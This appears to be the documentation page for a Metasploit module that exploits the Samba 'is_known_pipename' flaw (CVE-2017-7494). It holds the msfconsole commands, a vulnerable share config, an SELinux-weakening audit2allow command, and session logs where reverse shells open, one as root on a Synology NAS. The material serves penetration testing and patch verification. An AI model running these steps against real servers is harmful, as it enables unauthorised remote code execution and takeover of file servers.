## Vulnerable Application

This module exploits Samba from versions 3.5.0-4.4.14, 4.5.10, and 4.6.4 by loading a malicious shared library.
Samba's download archives are [here](https://download.samba.org/pub/samba/stable/).  There are some requirements
for this exploit to be successful:

1. Valid credentials
2. Writeable folder in an accessible share
3. Server-side path of the writeable folder

However, in some cases anonymous access with common filesystem locations can be used to automate exploitation.

A vulnerable Samba config may have a share similar to the following in `smb.conf`.  This is a setup for 'easy' exploitation
where no SMB options are required to be set:

```
[exploitable]
comment = CVE-2017-7494
path = /tmp
writable = yes
browseable = yes
guest ok = yes
```

Verified on:

1. Synology DS412+ DSM 6.1.1-15101 Update 2 (Samba 4.4.9)
2. Synology DS412+ DSM 6.1.1-15101 Update 3 (Samba 4.4.9)
3. Synology DS1512+ DSM 6.1.1-15101 Update 2 (Samba 4.4.9)
4. Synology DS1512+ DSM 6.1.1-15101 Update 3 (Samba 4.4.9)
5. Synology DS2415+ DSM 6.1-15047 (Samba 4.3.11)
6. Ubuntu 14.04.5 x64 (Samba 4.3.9)
7. Ubuntu 15.04 (Samba 4.1.13)
8. Ubuntu 16.04 (Samba 4.3.11)
   * 1:4.3.11+dfsg-0ubuntu0.16.04.3 and older are vulnerable, fixed in [2:4.3.11+dfsg-0ubuntu0.16.04.7](https://launchpad.net/ubuntu/+source/samba/2:4.3.11+dfsg-0ubuntu0.16.04.7)
9. Fedora 24 (Samba 4.4.13)

Currently not working against:

1. QNAP NAS Samba 4.4.9 on armv71
2. WD MyClous NAS Samba 4.0.0rc5 armv71

### SELinux

Fedora (and possibly Redhat) are not exploitable in their default installation.  SELinux must be adjusted to allow nmbd to use net_admin, and smbd to exec the payload.

```
echo -ne "type=AVC msg=audit(1495745298.086:334): avc:  denied  { execstack } for  pid=2365 comm="smbd" scontext=system_u:system_r:smbd_t:s0 tcontext=system_u:system_r:smbd_t:s0 tclass=process permissive=0\ntype=AVC msg=audit(1495717997.099:267): avc:  denied  { net_admin } for  pid=959 comm="nmbd" capability=12  scontext=system_u:system_r:nmbd_t:s0 tcontext=system_u:system_r:nmbd_t:s0 tclass=capability permissive=0\ntype=AVC msg=audit(1495745002.690:308): avc:  denied  { execmem } for  pid=1830 comm="smbd" scontext=system_u:system_r:smbd_t:s0 tcontext=system_u:system_r:smbd_t:s0 tclass=process permissive=0\ntype=AVC msg=audit(1495745183.319:331): avc:  denied  { execute } for  pid=2313 comm="smbd" path="/tmp/ucFtDpZI.so" dev="tmpfs" ino=27436 scontext=system_u:system_r:smbd_t:s0 tcontext=system_u:object_r:smbd_tmp_t:s0 tclass=file permissive=0" | audit2allow -M cve-2017-7494; semodule -X 300 -i cve-2017-7494.pp
```

## Verification Steps

1. Start msfconsole
2. Do: ```use exploit/linux/samba/is_known_pipename```
3. Do: ```set rhost [ip]```
4. Do: ```set target [target #]```
5. Do: ```exploit```

## Options

  **SMB_SHARE_NAME**

  The name of the SMB share containing a writeable directory.  Shares are automatically scanned for, and if this
  variable is non-blank, it will be preferred.

  **SMB_SHARE_BASE**

  The remote filesystem path correlating with the SMB share name.  This value is preferred, but other values are
  brute forced including:

1. /volume1
2. /volume2
3. /volume3
4. /shared
5. /mnt
6. /mnt/usb
7. /media
8. /mnt/media
9. /var/samba
10. /tmp/home/home/shared

  **SMB_FOLDER**

  The directory to use within the writeable SMB share.  Writable directories are automatically scanned for, and if this
  variable is non-blank, it will be preferred.

## Scenarios

### Synology DS412+ w/ INTEL Atom D2700 on DSM 6.1.1-15101 Update 2

```
msf exploit(is_known_pipename) > exploit

[*] Started reverse TCP handler on 1.2.3.117:4444
[*] 1.2.3.119:445 - Using location \\1.2.3.119\ESX\ for the path
[*] 1.2.3.119:445 - Payload is stored in //1.2.3.119/ESX/ as eePUbtdw.so
[*] 1.2.3.119:445 - Trying location /volume1/eePUbtdw.so...
[-] 1.2.3.119:445 - Probe: /volume1/eePUbtdw.so: The server responded with error: STATUS_OBJECT_NAME_NOT_FOUND (Command=162 WordCount=0)
[*] 1.2.3.119:445 - Trying location /volume1/ESX/eePUbtdw.so...
[*] Command shell session 1 opened (1.2.3.117:4444 -> 1.2.3.119:34366) at 2017-05-24 21:12:07 -0400

id
uid=0(root) gid=0(root) groups=0(root),100(users)
uname -a
Linux synologyNAS 3.10.102 #15101 SMP Fri May 5 12:01:38 CST 2017 x86_64 GNU/Linux synology_cedarview_412+
```

### Ubuntu 16.04

```
msf exploit(is_known_pipename) > exploit

[*] Started reverse TCP handler on 192.168.0.3:4444
[*] 192.168.0.3:445 - Using location \\192.168.0.3\yarp\h for the path
[*] 192.168.0.3:445 - Payload is stored in //192.168.0.3/yarp/h as GTithXJz.so
[*] 192.168.0.3:445 - Trying location /tmp/yarp/h/GTithXJz.so...
[*] Command shell session 6 opened (192.168.0.3:4444 -> 192.168.0.3:45076) at 2017-05-24 19:41:40 -0500

id
uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)
```
